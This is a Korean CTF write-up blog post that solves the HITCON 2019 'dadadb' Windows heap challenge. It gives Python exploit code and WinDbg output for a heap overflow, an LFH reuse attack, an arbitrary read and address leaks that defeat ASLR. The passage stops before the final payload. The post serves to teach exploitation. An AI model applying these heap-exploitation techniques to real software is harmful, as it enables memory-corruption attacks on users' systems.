

<!DOCTYPE html>
<html lang="ko-KR" data-default-color-scheme="&#34;auto&#34;">



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
  <link rel="icon" type="image/png" href="/img/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="hack &amp; life">
  <meta name="author" content="j0dev, y2sman">
  <meta name="keywords" content>
  <meta name="google-site-verification" content="DXkyiaX95-ws53Tyt0m91_umRf4gfV2qJIQZ5zQDIO4">

  <meta property="og:type" content="website"> 
  <meta property="og:title" content="[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 4 - HITCON 2019 dadadb - hackyboiz">
  <meta property="og:description" content="hack &amp; life">
  <meta property="og:image" content="/img/favicon.ico">
  <meta property="og:url" content="https://hackyboiz.github.io/">

  <link rel="canonical" href="https://hackyboiz.github.io/2021/04/18/l0ch/pwncoolsexy-part4/">

  <title>[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 4 - HITCON 2019 dadadb - hackyboiz</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">


  <link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css">
  <link rel="stylesheet" href="/lib/hint/hint.min.css">

  
    
    <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css">
  

  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_6peoq002giu.css">
<link rel="stylesheet" href="/.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
<link rel="stylesheet" href="/.css">


<link rel="stylesheet" href="/css/main.css">

<!-- 自定义样式保持在最底部 -->


  <script src="/js/utils.js"></script>
  <script src="/js/color-schema.js"></script>

<meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/rss2.xml" title="hackyboiz" type="application/rss+xml">
</head>

<body>
  <header style="height: 40vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>Hackyboiz</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-addrcard"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/author/">
                <i class="iconfont icon-user-fill"></i>
                Author
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" href="javascript:">&nbsp;<i class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner intro-2" id="background" parallax="true" style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container page-header text-center fade-in-up">
            <span class="h2" id="subtitle">
              
            </span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2021-04-18 14:00" pubdate>
      2021년 4월 18일 오후
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      1.7k 자
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      33
       분
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2">
      <script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
    </div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto" id="post">
            <!-- SEO header -->
            <h1 style="display: none">[Research] Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 4 - HITCON 2019 dadadb</h1>
            
            <div class="markdown-body" id="post-body">
              <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
              <!-- hackyboiz_horizen_index -->
              <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-3672652207808168" data-ad-slot="8887862313" data-ad-format="auto" data-full-width-responsive="true"></ins>
              <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
              </script>
              <h1 id="이전-시리즈-바로가기"><a href="#이전-시리즈-바로가기" class="headerlink" title="이전 시리즈 바로가기"></a>이전 시리즈 바로가기</h1><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 1 - pwntools for windows</a></p>
<p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 2 - NT Heap</a></p>
<p><a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/">Pwn하고 Cool하고 Sexy한 Windows 탐방기 Part 3 - NT Heap(2)</a></p>
<p>안녕하세요 L0ch입니다! </p>
<p>벌써 블로그 오픈한지 반년이 되는 4월이네요!  <del><em>그리고 다음주면 중간고사랍니다 흑ㅎ그 ㅠㅠ</em></del> </p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled.png"></p>
<blockquote>
<p>나.. 졸업할 수 있을까..?</p>
</blockquote>
<p>시험기간에는 역시 딴 거 하는 게 제일 재밌죠. 그래서 이번 파트는 시험기간 버프를 받아 제일 재밌게 작성했습니다 ㅎㅎ; (학점과 등가 교환한 건 덤) 오늘은 HITCON 2019 Quals에 출제된 Windows pwnable 문제인 dadadb를 풀어보면서 NT Heap에서의 exploitation을 자세하게 다뤄보겠습니다! </p>
<h1 id="Environment"><a href="#Environment" class="headerlink" title="Environment"></a>Environment</h1><ul>
<li>Windows x64 on windows sever 2019<ul>
<li>Similar to Windows 10 (1809)</li>
</ul>
</li>
<li>AppJailLauncher</li>
<li>DEP</li>
<li>ASLR</li>
<li>CFG</li>
<li>자식 프로세스 생성 불가<ul>
<li>새 프로세스 생성 불가능</li>
</ul>
</li>
<li>Private Heap</li>
</ul>
<p>Windows 1809 (빌드 17763.1) 환경에서 진행했습니다! </p>
<p>여담으로.. Windows10 1809 버전에서는 Windows Terminal 지원이 안돼 눈물을 머금고 winpwn의 폰트 스타일을 지원하지 않는 다른 터미널을 쓸 수 밖에 없었습니다;; 해킹할 땐 모니터가 화려해야 하는데.. 그럼 익스 안되던 것도 되는거 ㅇㅈ?</p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%201.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%201.png"></p>
<blockquote>
<p><strong>주의</strong> 겉멋만 들면 망한다.</p>
</blockquote>
<p>제 얘기네요 ㅎㅎ.. 아무튼, 문제 바이너리를 찬찬히 뜯어보면서 분석을 시작해보겠습니다! </p>
<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>바이너리를 실행하면 다른 설명 없이 입력을 받는데, 1번으로 로그인할 수 있습니다. </p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%202.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%202.png"></p>
<p><code>user.txt</code>에 있는 여러 계정과 패스워드 중 하나로 로그인하면 간단한 DB 기능이 구현된 걸 확인할 수 있네요.</p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%203.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%203.png"></p>
<blockquote>
<p>user.txt의 계정과 패스워드</p>
</blockquote>
<p>로그인한 이후 메뉴는 다음과 같습니다.</p>
<ol>
<li>add<ul>
<li>key, size, data를 입력받아 노드 추가</li>
<li>node list에 key가 존재하면 해당 key의 data 수정</li>
</ul>
</li>
<li>view<ul>
<li>key를 입력받아 노드 검색 후 key와 data 출력</li>
</ul>
</li>
<li>delete<ul>
<li>key를 입력받아 해당하는 노드 삭제</li>
</ul>
</li>
<li>logout<ul>
<li>로그아웃하고 로그인 전으로 돌아감</li>
</ul>
</li>
</ol>
<p>기능이 많지 않아 이 정도로만 정리하고 바로 취약점부터 찾아볼게요.</p>
<h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><p>우선 입력받은 데이터를 저장하는 구조체인 <code>node</code> 는 아래와 같으며 256개의 포인터 배열로 선언되어 있습니다.</p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%204.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%204.png"></p>
<pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>&#123;</span>
	<span class="hljs-keyword">char</span>* data;
	<span class="hljs-keyword">size_t</span> size;
	<span class="hljs-keyword">char</span> key[<span class="hljs-number">41</span>];
	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">next</span>;</span>
&#125;

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>* <span class="hljs-title">list</span>[256];</span></code></pre>

<p><code>main()</code>부터 살펴보겠습니다. <code>user.txt</code> 의 계정으로 로그인 쉘을 얻은 이후의 코드입니다.</p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%205.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%205.png"></p>
<p>이중 새로운 node를 추가하는 <code>add_sub_1340()</code> 함수를 자세히 보겠습니다.</p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%206.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%206.png"></p>
<p><code>add_sub_1340()</code>의 node를 추가하는 부분의 코드입니다.</p>
<ul>
<li><code>Key</code>를 입력받고 빨간 박스에서 현재 node list에 입력받은 <code>Key</code>값이 존재하는지 검색합니다.</li>
<li>만약 못 찾았다면 <code>LABEL_13</code>으로 점프해 새 node를 생성하고 찾았다면 아래 코드를 진행합니다.<ul>
<li>찾은 경우 linked list의 head에 새 node를 삽입합니다. (node[2] → node[1] → node[0]…)</li>
</ul>
</li>
</ul>
<p>입력받은 Key값이 이미 존재하는 경우를 좀 더 자세히 볼까요?</p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%207.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%207.png"></p>
<ul>
<li>일치하는 <code>Key</code>값의 노드를 찾았으면 해당 <code>node→data</code>를 할당 해제하고 사이즈를 <code>new_size</code>에 새로 입력받습니다.</li>
<li><code>new_size</code>의 최댓값을 <code>0x1000</code>으로 제한합니다.</li>
<li><code>new_size</code>만큼 <code>node→data</code>에 새로 Heap을 할당합니다.</li>
<li><code>new_size</code>만큼 새로 할당한 <code>node→data</code>에 이전에 할당된 <code>node→data</code>의 사이즈인 <code>old_size</code>만큼 입력을 받습니다.<ul>
<li><code>new_size</code>가 <code>old_size</code>보다 작으면 Heap buffer overflow가 발생합니다.</li>
</ul>
</li>
</ul>
<h1 id="Leak-Address"><a href="#Leak-Address" class="headerlink" title="Leak Address"></a>Leak Address</h1><p>먼저 Heap overflow를 이용해 Heap 주소를 leak 해보겠습니다. 오늘은 LFH를 다룰 것이기 때문에 LFH가 활성화된 chunk에서 진행하도록 할게요.</p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%208.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%208.png"></p>
<p>node를 추가하다 보면 19번째에서 LFH 플래그가 활성화됩니다. 이후 node를 세 개만 추가해서 어떤 위치에 할당되어있는지 확인해보겠습니다.</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *

<span class="hljs-comment">#...</span>

p = process(<span class="hljs-string">&quot;./dadadb.exe&quot;</span>)

login(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)
<span class="hljs-comment">## enable LFH</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>):
	add(<span class="hljs-string">&quot;l0ch&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;BBBB&quot;</span>)

<span class="hljs-comment">## fill userblock</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):
	add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;BBBB&quot;</span>)</code></pre>

<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%209.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%209.png"></p>
<p>LFH가 활성화된 chunk들이 무작위로 heap에 할당된 것을 볼 수 있습니다. 이렇게 무작위로 할당되어 chunk 간 거리가 불규칙하면 원하는 chunk에 접근하기 어려워집니다. 한마디로 원하는 heap layout을 구성하기 힘들어지죠. 따라서 일반적으로는 reliable 한 leak이 불가능.. 하지만! 방법이 있으니까 이런 삽질을 하는 거 아니겠어요?ㅎㅎ</p>
<h2 id="LFH-Reuse-Attack"><a href="#LFH-Reuse-Attack" class="headerlink" title="LFH Reuse Attack"></a>LFH Reuse Attack</h2><p>자 이제 전 파트에서 배운 <a href="https://hackyboiz.github.io/2021/03/28/l0ch/pwncoolsexy-part3/#Front-End-Exploitation">reuse attack</a>을 써먹을 차례입니다. 무작위 할당으로 할당될 chunk 위치를 예측하기 힘들다면? 그럼 다 채워버리고 한 곳만 남겨놔서 예측 가능하게 만들면 됩니다!</p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2010.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2010.png"></p>
<blockquote>
<p>선택지는 없다.</p>
</blockquote>
<p>그림으로 나타내면 아래와 같습니다. </p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2011.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2011.png"></p>
<ol>
<li>LFH chunk로 userblock을 모두 채웁니다. </li>
<li>임의의 chunk(여기서는 LFH5)를 해제하면 현재 userblock에는 빈 공간이 LFH5가 해제된 공간밖에 남아있지 않습니다.</li>
<li>add LFH4로 <code>LFH4→data</code>를 다시 할당하면 LFH는 해제된 chunk 우선으로 할당하게 되어 해제된 LFH5 공간에 새로 data를 할당합니다.  </li>
<li>3번의 과정에서 overflow 취약점이 있으니 이제 씹고 뜯고 맛보고 즐기기만 하면 됩니다!</li>
</ol>
<p>먼저 LFH chunk를 0~16까지 17개를 할당합니다. </p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2012.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2012.png"></p>
<p>랜덤 한 위치에 할당되어 순서는 뒤죽박죽이지만 옹기종기 예쁘게 모여있는 것이 보입니다. chunk17부터는 아래 사진과 같이 새 userblock에 할당되기 때문에 LFH chunk는 기존 userblock을 모두 채울 정도인 0~16까지 17개만 할당합니다. 이는 <code>ActiveSubsegment-&gt;AggregateExchg-&gt;Depth</code>를 참고해 해당 userblock에서 사용 가능한 block이 얼마나 되는지 확인해보면 됩니다.</p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2013.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2013.png"></p>
<p>이제 LFH5 chunk를 해제하고 add(LFH4)를 통해 해제후 재 할당된 <code>LFH4→data</code> 가 LFH5 chunk에 위치해 있는 것을 볼 수 있습니다. data에 입력한 <code>aaaaaaaa</code> 도 잘 들어가 있네요!</p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2014.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2014.png"></p>
<p>이제 <code>0x70</code>만큼 채우면 뒤의 heap address로 heap base address와 바로 뒤 chunk의 key까지 얻을 수 있습니다.</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> winpwn <span class="hljs-keyword">import</span> *

<span class="hljs-comment">#...</span>

context.log_level = <span class="hljs-string">&quot;debug&quot;</span>
p = process(<span class="hljs-string">&quot;./dadadb.exe&quot;</span>)

login(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;&quot;</span>)
<span class="hljs-comment">## enable LFH</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">18</span>):
	add(<span class="hljs-string">&quot;l0ch&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)

<span class="hljs-comment">## fill userblock</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">17</span>):
	add(<span class="hljs-string">&quot;LFH&quot;</span>+str(i),<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot;B&quot;</span>*<span class="hljs-number">0x90</span>)

delete(<span class="hljs-string">&quot;LFH5&quot;</span>)
add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>)
view(<span class="hljs-string">&quot;LFH4&quot;</span>)
p.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x70</span>)
heap_base = u64(p.recv(<span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xffffffffffff0000</span> 

p.recvuntil(p64(<span class="hljs-number">0x90</span>))
key = p.recvuntil(<span class="hljs-string">&quot;\x00&quot;</span>)[:<span class="hljs-number">-1</span>]
print(<span class="hljs-string">&quot;heap : &quot;</span>,hex(heap_base))
print(<span class="hljs-string">&quot;key :&quot;</span>,key)</code></pre>

<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2015.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2015.png"></p>
<p>바로 뒤에 있는 chunk의 key를 구했으니 overflow를 이용하면 leak 한 key의 <code>data</code> 포인터를 수정하면 arbitrary read가 가능하죠! 우리가 필요한 주소들은 다음과 같습니다.</p>
<ul>
<li>ntdll base: ROP gadget</li>
<li>image base</li>
<li>kernel32 base: <code>CreateFile()</code>, <code>ReadFile()</code>, <code>WriteFile()</code></li>
<li>PEB : <code>ProcessParameters</code>(stdin, stdout, stderr)</li>
<li>stack address</li>
</ul>
<h2 id="ntdll-base"><a href="#ntdll-base" class="headerlink" title="ntdll base"></a>ntdll base</h2><p><code>_HEAP-&gt;LockVariable-&gt;Lock</code> 은 <code>heap_base + 0x2c0</code> 에 위치해 있습니다. </p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2016.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2016.png"></p>
<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2017.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2017.png"></p>
<p><code>Lock - 0x163d30</code> 로 ntdll의 base address를 구할 수 있습니다. (그리고 윈도우 업데이트 때문에 ntdll 버전이 바뀌어 <code>0x163dd0</code>으로 바뀌었다는 슬픈 사연이… 업데이트 미워)</p>
<pre><code class="hljs python"><span class="hljs-comment">#...</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">readmem</span>(<span class="hljs-params">key, addr</span>):</span>
	add(<span class="hljs-string">&quot;LFH4&quot;</span>,<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span> + p64(addr))
	view(key)
	p.recvuntil(<span class="hljs-string">&quot;Data:&quot;</span>)
	<span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">8</span>))

<span class="hljs-comment">#...</span>

Lock = readmem(key, heap_base+<span class="hljs-number">0x2c0</span>)<span class="hljs-comment"># _HEAP-&gt;LockVariable-&gt;Lock</span>
ntdll = Lock - <span class="hljs-number">0x163dd0</span> <span class="hljs-comment">#Lock - ntdll base address offset</span>
print(hex(ntdll))</code></pre>

<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2018.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2018.png"></p>
<h2 id="Imagebase"><a href="#Imagebase" class="headerlink" title="Imagebase"></a>Imagebase</h2><p>ntdll 주소를 구했으면 바이너리의 imagebase도 금방 구할 수 있습니다. 바로 <code>PebLdr</code> 을 이용해서 구하면 됩니다!</p>
<blockquote>
<p>PebLdr : 로드된 모듈들의 Double Linked List를 담고 있으며 <code>_PEB→Ldr</code>에서 참조한다.</p>
</blockquote>
<pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lm 
start             end                 module name
...           
<span class="hljs-number">00007f</span>fd`ea290000 <span class="hljs-number">00007f</span>fd`ea47d000   ntdll      (pdb symbols)    

<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dt ntdll!_PEB @$peb Ldr
   +<span class="hljs-number">0x018</span> Ldr : <span class="hljs-number">0x00007ffd</span>`ea3f53c0 _PEB_LDR_DATA

<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dx -r1 ((ntdll!_PEB_LDR_DATA *)<span class="hljs-number">0x7ffdea3f53c0</span>)
((ntdll!_PEB_LDR_DATA *)<span class="hljs-number">0x7ffdea3f53c0</span>)            : <span class="hljs-number">0x7ffdea3f53c0</span> [Type: _PEB_LDR_DATA *]
    [+<span class="hljs-number">0x000</span>] Length           : <span class="hljs-number">0x58</span> [Type: unsigned long]
    [+<span class="hljs-number">0x004</span>] Initialized      : <span class="hljs-number">0x1</span> [Type: unsigned char]
    [+<span class="hljs-number">0x008</span>] SsHandle         : <span class="hljs-number">0x0</span> [Type: <span class="hljs-built_in">void</span> *]
    [+<span class="hljs-number">0x010</span>] InLoadOrderModuleList [Type: _LIST_ENTRY]
    [+<span class="hljs-number">0x020</span>] InMemoryOrderModuleList [Type: _LIST_ENTRY]
...
<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; ? <span class="hljs-number">00007f</span>fd`ea3f53c0 - <span class="hljs-number">00007f</span>fd`ea290000
Evaluate expression: <span class="hljs-number">1463232</span> = <span class="hljs-number">00000000</span>`<span class="hljs-number">001653</span>c0</code></pre>

<p><code>PebLdr</code> 은 <code>ntdll + 0x1653c0</code> 이 되겠네요. 그럼 <code>PebLdr</code>에서 문제 바이너리 dadadb를 찾아보겠습니다.</p>
<p>모듈이 로드되면 <code>ntdll!_PEB_LDR_DATA→InMemoryOrderModuleList(+0x20)</code> 에 먼저 로드된 순서대로 Double Linked List로 연결됩니다. 그럼 실행중인 바이너리도 당연히 올라와 있겠죠?</p>
<pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dx -r1 (*((ntdll!_LIST_ENTRY *)<span class="hljs-number">0x7ffdea3f53e0</span>))
(*((ntdll!_LIST_ENTRY *)<span class="hljs-number">0x7ffdea3f53e0</span>))                 [Type: _LIST_ENTRY]
    [+<span class="hljs-number">0x000</span>] Flink            : <span class="hljs-number">0x185b0702660</span> [Type: _LIST_ENTRY *]
    [+<span class="hljs-number">0x008</span>] Blink            : <span class="hljs-number">0x185b0704020</span> [Type: _LIST_ENTRY *]
<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dps <span class="hljs-number">0x185b0702660</span>
<span class="hljs-number">00000185</span>`b0702660  <span class="hljs-number">00000185</span>`b07024d0
<span class="hljs-number">00000185</span>`b0702668  <span class="hljs-number">00007f</span>fd`ea3f53e0 ntdll!PebLdr+<span class="hljs-number">0x20</span>
<span class="hljs-number">00000185</span>`b0702670  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>
<span class="hljs-number">00000185</span>`b0702678  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>
<span class="hljs-number">00000185</span>`b0702680  <span class="hljs-number">00007f</span>f6`<span class="hljs-number">5f</span>1d0000 dadadb
<span class="hljs-number">00000185</span>`b0702688  <span class="hljs-number">00007f</span>f6`<span class="hljs-number">5f</span>1d1eb0 dadadb+<span class="hljs-number">0x1eb0</span>
<span class="hljs-number">00000185</span>`b0702690  <span class="hljs-number">00000000</span>`<span class="hljs-number">00009000</span>
...</code></pre>

<p>잘 올라와 있네요! </p>
<pre><code class="hljs python"><span class="hljs-comment">#...</span>
pebldr = ntdll + <span class="hljs-number">0x1653c0</span>
IMOML = readmem(key, pebldr+<span class="hljs-number">0x20</span>)
print(<span class="hljs-string">&quot;InMemoryOrderModuleList: &quot;</span>,hex(IMOML))
imagebase = readmem(key, IMOML+<span class="hljs-number">0x20</span>)
print(<span class="hljs-string">&quot;imagebase :&quot;</span>,hex(imagebase))
<span class="hljs-comment">#...</span></code></pre>

<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2019.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2019.png"></p>
<h2 id="kernel32-base"><a href="#kernel32-base" class="headerlink" title="kernel32 base"></a>kernel32 base</h2><p>imagebase를 구했으니 kernel32 base address는 IAT 테이블을 이용해 쉽게 구할 수 있습니다. 자세한 방법은 제가 작년에 출제한 문제인 <a href="https://hackyboiz.github.io/2020/12/29/l0ch/address_book/#Exploit">Christmas CTF 2020 - addressbook</a> write-up에 설명되어 있습니다.</p>
<pre><code class="hljs angelscript"><span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; !dh <span class="hljs-number">00007f</span>f6`a72d0000
...
<span class="hljs-number">3000</span> [     <span class="hljs-number">230</span>] address [size] of Import Address Table Directory
...

<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; lm
start             end                 module name
...    
<span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea60000 <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>eb12000   KERNEL32   (pdb symbols) 
...
                
<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; dps <span class="hljs-number">00007f</span>f6`a72d0000 + <span class="hljs-number">3000</span> L230
<span class="hljs-number">00007f</span>f6`a72d3000  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea82460 KERNEL32!ReadFile
<span class="hljs-number">00007f</span>f6`a72d3008  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea7e7e0 KERNEL32!HeapCreateStub
<span class="hljs-number">00007f</span>f6`a72d3010  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea763a0 KERNEL32!HeapFreeStub
<span class="hljs-number">00007f</span>f6`a72d3018  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea7c660 KERNEL32!GetStdHandleStub
<span class="hljs-number">00007f</span>f6`a72d3020  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ed7aa20 ntdll!RtlAllocateHeap
<span class="hljs-number">00007f</span>f6`a72d3028  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea7e970 KERNEL32!IsDebuggerPresentStub
<span class="hljs-number">00007f</span>f6`a72d3030  <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>edb4410 ntdll!RtlInitializeSListHead
...

<span class="hljs-number">0</span>:<span class="hljs-number">004</span>&gt; ? <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea82460 - <span class="hljs-number">00007f</span>fb`<span class="hljs-number">7</span>ea60000
Evaluate expression: <span class="hljs-number">140384</span> = <span class="hljs-number">00000000</span>`<span class="hljs-number">00022460</span></code></pre>

<p><code>kernel32!ReadFile</code> 함수는 kernel32 base의 <code>0x22460</code>에 위치해 있습니다.</p>
<pre><code class="hljs python">kernel32 = readmem(key, imagebase+<span class="hljs-number">0x3000</span>) - <span class="hljs-number">0x22460</span>
print(<span class="hljs-string">&quot;kernel32 :&quot;</span>,hex(kernel32))</code></pre>

<p><img src="/2021/04/18/l0ch/pwncoolsexy-part4/Untitled%2020.png" srcset="/img/loading.gif" alt="pwncoolsexy-part4/Untitled%2020.png"></p>
<p>자 이제 거의 다왔습니다..!</p>
